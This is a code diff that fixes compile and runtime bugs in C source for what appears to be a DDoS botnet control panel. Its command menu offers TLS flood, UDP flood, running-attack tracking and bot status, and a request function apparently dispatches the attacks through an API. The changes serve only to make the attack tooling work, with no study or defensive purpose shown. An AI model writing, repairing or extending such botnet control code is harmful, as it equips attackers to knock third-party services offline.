@@ -250,7 +250,7 @@ void print_logged_in(int client_fd, char *username) {
 
 char* get_prompt(char *username) {
     static char prompt[128];
-    sprintf(prompt, "\e[1;36m%s\e[0m\e[1;37m@\e[0m\e[1;35mtanxio\e[0m\e[1;37m~\e[0m# ");
+    sprintf(prompt, "\e[1;36m%s\e[0m\e[1;37m@\e[0m\e[1;35mtanxio\e[0m\e[1;37m~\e[0m# ", username);
     return prompt;
 }
 
@@ -296,7 +296,7 @@ void send_http_request(char *api_url, char *result, int result_size) {
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
-    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
+    memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
     addr.sin_port = htons(port);
     
     if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
@@ -348,7 +348,7 @@ void handle_command(int client_fd, char *username, char *cmd) {
         len += sprintf(buffer + len, "  \e[1;35m!tls-f\e[0m <url> <time> <slot>  TLS flood (L7)\n");
         len += sprintf(buffer + len, "  \e[1;35m!udp\e[0m <ip> <port> <time> <slot>  UDP attack (L4)\n");
         len += sprintf(buffer + len, "  \e[1;35m!ongoing\e[0m                  Show running attacks\n");
-        len += buffer + len, "  \e[1;35m!stop\e[0m <id>                  Stop an attack\n");
+        len += sprintf(buffer + len, "  \e[1;35m!stop\e[0m <id>                  Stop an attack\n");
         len += sprintf(buffer + len, "  \e[1;35m!bots\e[0m                       Show botnet status\n");
         len += sprintf(buffer + len, "  \e[1;35m!clear\e[0m                     Clear screen\n");
         len += sprintf(buffer + len, "\n");
